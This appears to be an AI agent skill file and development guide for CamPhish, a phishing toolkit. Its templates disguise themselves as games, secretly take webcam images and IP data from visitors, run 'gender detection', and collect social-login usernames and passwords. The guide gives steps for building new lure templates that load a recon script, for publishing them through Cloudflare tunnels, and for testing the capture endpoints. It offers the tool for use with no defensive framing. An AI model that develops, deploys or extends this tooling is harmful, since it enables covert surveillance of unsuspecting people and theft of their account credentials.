# CamPhish Development Skill

## When to Use
- Working on CamPhish backend (Rust/axum)
- Working on CamPhish frontend (React/Vite)
- Creating or modifying templates
- Debugging capture pipeline
- Working with TrailBase integration
- Docker/deployment issues

## Quick Reference

### Start Services
```bash
cd ~/Projects/CamPhish
docker compose --profile cloudflared up -d
# Dashboard: http://localhost:8080
# TrailBase: http://localhost:4000/_/admin/
# Game: http://localhost:8080/t/face-runner
```

### Stop Services (DO NOT use -v)
```bash
docker compose --profile cloudflared down
# NEVER: docker compose down -v  (deletes DB + captures)
```

### Rebuild After Code Changes
```bash
docker compose build app && docker compose --profile cloudflared up -d --force-recreate app
```

### Check Rust Compilation
```bash
cd backend && cargo check
```

### Build Frontend
```bash
cd frontend && npm install && npm run build
```

### Get Tunnel URL
```bash
docker compose logs cloudflared 2>&1 | grep -o 'https://[-0-9a-z]*\.trycloudflare.com' | tail -1
```

### Test Capture Pipeline
```bash
curl -s -X POST http://localhost:8080/api/capture/ip -H "Content-Type: application/json" -d '{}'
curl -s -X POST http://localhost:8080/api/capture/image -H "Content-Type: application/json" -d '{"cat":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="}'
curl -s http://localhost:8080/api/stats
```

### Create New Template
1. Create `templates/my-template.html`
2. First line: `<!-- DESC: Description here -->`
3. Include: `<script src="forwarding_link/t/recon.js"></script>`
4. Call: `if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});`
5. Camera: `navigator.mediaDevices.getUserMedia(...)` → `CamPhishRecon.Capture.image(dataUrl, method)`
6. Restart app: `docker compose restart app`

### Common Bugs Checklist
- [ ] DOM elements use `el` prefix (elScore not score)
- [ ] Game starts without camera (camera is optional)
- [ ] Touch + keyboard controls both work
- [ ] `recon.js` included before game script
- [ ] `CamPhishRecon.init()` called on game start
- [ ] Share card function exists
- [ ] No `forwarding_link` remaining in served HTML (should be replaced)
- [ ] No `API_BASE_URL` remaining in served HTML (should be `/api`)
- [ ] TrailBase migration is V7+ (not V1-V6)
- [ ] SQL DEFAULT clauses have proper closing parens + comma

## Architecture Decision Records
1. **Rust over PHP**: Performance, type safety, single binary
2. **SQLite over Postgres**: Zero-config, WAL mode, sufficient for single-instance
3. **Alpine over Debian**: Smaller image, apt-get broken in Docker Desktop
4. **TrailBase as secondary**: Admin UI + realtime, app uses SQLite directly for reliability
5. **recon.js shared library**: All templates share same recon code, updates apply universally
6. **Template placeholder system**: `API_BASE_URL` and `forwarding_link` replaced at serve time
7. **Credential capture**: Social login templates send username/password to `/api/capture/credentials`
